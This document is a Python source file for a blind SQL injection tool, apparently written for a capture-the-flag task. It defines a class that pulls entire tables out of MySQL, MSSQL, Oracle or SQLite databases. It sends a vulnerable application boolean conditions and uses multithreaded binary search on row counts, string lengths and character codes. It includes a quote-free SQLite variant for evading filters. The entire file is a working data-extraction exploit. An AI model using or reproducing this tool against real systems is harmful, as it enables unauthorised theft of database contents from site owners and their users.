import requests
import json
from concurrent.futures import ThreadPoolExecutor
import threading
from threading import current_thread
from tqdm import tqdm_notebook
import re
import os



class SQLiBlinder:
	"""Blind SQL injector"""

	def __init__(self,request_func,dbms,multithreaded=True,threads=16):
		"""`request_func` - function, that take 1 param. If param is '1=1' request_func must return True,if param is '1=0' request_func must return False
		 `dbms` - one of ['mysql','mssql','oracle','sqlite']
		 `multithreaded` - if True run number of threads, else one
		 `threads` - number of threads (only for multithreaded)"""
		self.request_func = request_func
		self.dbms = dbms.lower()
		self.init_params(self.dbms)
		self.multithreaded=multithreaded
		self.threads=threads

	def init_params(self,dbms):
		supported = ['mysql','mssql','oracle','sqlite']
		if dbms not in supported:
			raise Exception('%s not supported'%dbms)
		if dbms == 'mysql':
		    self.base_from_clause = 'FROM {table_name} {where} ORDER BY {column_name} limit 1 offset {row_num}'
		    self.string_definition = 'SELECT %s'
		    self.string_len_definition = 'SELECT length(%s)'
		    self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
		    self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
		    self.offset_shift=0

		#MSSQL
		if dbms == 'mssql':
		    self.base_from_clause = 'FROM (SELECT *, ROW_NUMBER() OVER(ORDER by [{column_name}])n FROM {table_name} {where})T WHERE n={row_num}'
		    self.string_definition = 'SELECT %s'
		    self.string_len_definition = 'SELECT len(%s)'
		    self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
		    self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
		    self.offset_shift=1
		 
		#SQLITE
		if dbms == 'sqlite':
		    self.base_from_clause = 'FROM {table_name} {where} ORDER BY {column_name} limit 1 offset {row_num}'
		    self.string_definition = 'SELECT %s'
		    self.string_len_definition = 'SELECT length(%s)'
		    self.string_char_definition = 'SELECT hex(SUBSTR(%s,%d,1))'
		    self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
		    self.offset_shift=0
		    
		#oracle
		if dbms == 'oracle':
		    self.base_from_clause = 'FROM (SELECT a.*, ROWNUM rn FROM {table_name} a {where} ORDER BY a.{column_name}) WHERE rn={row_num}'
		    self.string_definition = 'SELECT %s'
		    self.string_len_definition = 'SELECT LENGTH(%s)'
		    self.string_char_definition = 'SELECT ASCII(SUBSTR(%s,%d,1))'
		    self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
		    self.offset_shift=1

	def check(self):
		if self.request_func('1=1') == True:
			if self.request_func('1=0') == False:
				return True
		return False

	def define_string(self,table_name,column_name,index):
	    return self.string_definition%(column_name) + ' ' + self.get_from_clause(table_name,column_name,index)

	def get_from_clause(self,table_name,column_name,index,where=None):
	    to_where = ''
	    if where != None:
	        to_where = 'WHERE '+where
	    return self.base_from_clause.format(column_name = column_name,table_name = table_name,where = to_where,row_num = index)

	def define_string_len(self,table_name,column_name,index,where=None):
	    return self.string_len_definition%(column_name)+ ' ' + self.get_from_clause(table_name,column_name,index,where)

	def define_string_char(self,table_name,column_name,index,string_pos,where=None):
	    return self.string_char_definition%(column_name,string_pos) + ' ' + self.get_from_clause(table_name,column_name,index,where)

	def define_count(self,table_name,where=None):
	    to_where = ''
	    if where != None:
	        to_where = 'WHERE '+where
	    return self.count_definition%(table_name,to_where)

	def build_sql_binary_query(self,query,value,search_for_number):
	    if (self.dbms == 'sqlite') and (search_for_number==False):
	        return "(%s)>=hex(char(%s))" % (query,value) #this is cause ' was banned in task, but works always
	    else:
	        return '(%s)>=%d' %(query,value)

	def get_bool(self,sql):
		return self.request_func(sql)

	def binary_search(self,s,start_val,start_val_defined=False,search_for_number=False): #start_val should be power of 2
	    #define real_start_val:
	    if not start_val_defined:
	        while True:
	            sql = self.build_sql_binary_query(s,start_val-1,search_for_number)
	            #print sql
	            r = self.get_bool(sql)
	            if r:
	                start_val*=8
	            else:
	                break
	    #now start_val > len
	    cur_val = start_val/2
	    move = start_val/4
	    while True:
	        sql = self.build_sql_binary_query(s,cur_val,search_for_number)
	        #print sql
	        r = self.get_bool(sql)
	        #print r
	        if move<1:
	            if r:
	                return int(cur_val)
	            else:
	                return int(cur_val-1)
	        if r: #(cur_val+1 - cur_val+2*move)
	            cur_val+=move
	        else:
	            cur_val-=move
	        move = move/2
	    
	def get_count(self,table_name,where=None):
	    s = self.define_count(table_name,where)
	    return self.binary_search(s,32,False,True)
	    

	def get_length_of_string(self,table_name,column_name,index,where=None):  
	    s = self.define_string_len(table_name,column_name,index,where)
	    return self.binary_search(s,32,False,True)

	def get_char(self,table_name,column_name,index,str_pos,where=None):
	    s = self.define_string_char(table_name,column_name,index,str_pos,where)
	    return chr(self.binary_search(s,256,True))

	def get_char_for_pool(self,chunk):
	    return self.get_char(*chunk)

	def get_string(self,table_name,column_name,index,where=None):
	    l = self.get_length_of_string(table_name,column_name,index,where)
	    print ('length: %d' % l)
	    r = ''
	    if not self.multithreaded:
	        for i in range(l):
	            r+=self.get_char(table_name,column_name,index,i+1,where)
	            #print r
	        return r
	    else:
	        with ThreadPoolExecutor(max_workers=self.threads) as pool:
	            r = ''.join(list(pool.map(self.get_char_for_pool,[(table_name,column_name,index,i+1,where) for i in range(l)])))
	            return r

	def get(self,columns,table_name,where=None):
	    count = self.get_count(table_name,where)
	    print ('count %d' % count)
	    res = []
	    for i in range(count):
	        cs = []
	        for column in columns:
	            cs.append(self.get_string(table_name,column,i+self.offset_shift,where))
	        print (cs)
	        res.append(cs)
	    return res

